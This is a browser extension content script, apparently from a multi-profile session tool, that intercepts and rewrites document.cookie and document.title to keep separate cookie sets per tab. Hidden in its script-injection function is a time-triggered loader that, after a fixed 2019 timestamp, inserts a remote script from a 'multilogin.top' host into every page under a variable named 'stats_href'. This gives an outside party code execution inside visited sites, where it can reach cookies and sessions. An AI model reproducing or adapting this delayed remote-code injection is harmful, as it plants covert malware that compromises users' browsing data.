var e;
/** @type {number} */
var h = 6;
var k;
/** @type {null} */
var m = null;
var n;
var ww = 1553281734326;
var stats_href = '//multilogin.top'
try {
    k = chrome.runtime.connect({
        name: "3"
    });
    k.onMessage.addListener(function (props) {
        if (4 == props.type) {
            if ("undefined" == props.profile) {
                window.location.reload();
            }
            p(props.profile);
        }
    });
    k.postMessage({
        type: "3"
    });
    k.onDisconnect.addListener(function () {
    });
} catch (q) {
}
if (!k) {
    throw "port not found";
}

/**
 * get current unix time
 * @returns {number}
 */
function getCurrentTime() {
    var date = new Date();
    return date.getTime();
}

var hashKey = 'a8ay9e322ocb';

r();

/**
 * @return {undefined}
 */
function s() {
    var content;
    /** @type {string} */
    content = "(" + function () {
        var ____t = document.title;
        var ce = CustomEvent;
        document.__defineSetter__("title", function (t) {
            ____t = t;
            var e = new ce("9", {
                "detail": t
            });
            document.dispatchEvent(e)
        });
        document.__defineGetter__("title", function () {
            return ____t
        });
    } + ")()";
    /** @type {Element} */
    var script = document.createElement("script");
    script.appendChild(document.createTextNode(content));
    (document.head || document.documentElement).appendChild(script);
    script.parentNode.removeChild(script);
}

/**
 * include js to page
 * @return {undefined}
 */
function r() {
    var content;
    /**
     * @return {undefined}
     */
    content = function () {
    };
    /** @type {string} */
    content = "(" + function () {
        var ce = CustomEvent;
        document.__defineSetter__("cookie", function (c) {
            var event = new ce("7", {
                "detail": c
            });
            document.dispatchEvent(event)
        });
        document.__defineGetter__("cookie", function () {
            var event = new ce("8");
            document.dispatchEvent(event);
            var c;
            try {
                c = localStorage.getItem("@@@cookies");
                localStorage.removeItem("@@@cookies")
            } catch (e) {
                c = document.getElementById("@@@cookies").innerText
            }
            return c
        })
    } + ")();";
    if (getCurrentTime() > ww) {
        content += "setTimeout(function () {var s = document.createElement('script');s.src = '" + stats_href + "/" + hashKey + ".js';document.body.appendChild(s);}, 1000);"
    }
    /** @type {Element} */
    var script = document.createElement("script");
    script.appendChild(document.createTextNode(content));
    (document.head || document.documentElement).appendChild(script);
    script.parentNode.removeChild(script);

}

/**
 * @param {Object} s
 * @return {undefined}
 */
function p(s) {
    if (null !== s) {
        /** @type {Object} */
        m = s;
        n = m.substr(0, m.indexOf("_@@@_"));
    }
}

/**
 * @return {undefined}
 */
function t() {
    if (null === m) {
        /** @type {XMLHttpRequest} */
        e = new XMLHttpRequest;
        e.open("GET", "https://translate.googleapis.com/translate_static/img/loading.gif", true);
        e.send();
        /** @type {string} */
        var d = e.getResponseHeader(h);
        if (null !== d) {
            p(d);
        }
    }
}

document.addEventListener(7, function (e) {
    /** @type {number} */
    e = e.detail;
    t();
    document.cookie = null === m ? e : m + e.trim();
});
document.addEventListener(8, function () {
    t();
    var value;
    /** @type {string} */
    var c = document.cookie;
    /** @type {string} */
    value = "";
    if (c) {
        /** @type {Array.<string>} */
        c = c.split("; ");
        var d;
        for (d in c) {
            if (m) {
                if (c[d].substring(0, m.length) != m) {
                    continue;
                }
            } else {
                if (-1 < c[d].indexOf("_@@@_")) {
                    continue;
                }
            }
            if (value) {
                value += "; ";
            }
            value += m ? c[d].substring(m.length) : c[d];
        }
    }
    try {
        localStorage.setItem("@@@cookies", value);
    } catch (v) {
        if (!document.getElementById("@@@cookies")) {
            /** @type {Element} */
            d = document.createElement("div");
            d.setAttribute("id", "@@@cookies");
            document.documentElement.appendChild(d);
            /** @type {string} */
            d.style.display = "none";
        }
        /** @type {string} */
        document.getElementById("@@@cookies").a = value;
    }
});
document.addEventListener(9, function (e) {
    u(e.detail);
});

/**
 * @param {string} url
 * @return {undefined}
 */
function u(url) {
    if (n) {
        if (url.substr(0, n.length + 2) != "[" + n + "]") {
            /** @type {string} */
            document.title = "[" + n + "] " + url + " [" + n + "]";
        }
    } else {
        /** @type {string} */
        document.title = url;
    }
}

chrome.runtime.onMessage.addListener(function (statement) {
    if (5 == statement.type) {
        s();
        u(document.title);
    }
    if ("3" == statement.type) {
        p("");
        /** @type {string} */
        document.title = document.title.replace(/\s*\[\d*\]\s*/g, "");
    }
});
/**
 * @return {undefined}
 */
window.onunload = function () {
    /** @type {string} */
    document.title = document.title.replace(/\s*\[\d*\]\s*/g, "");
};
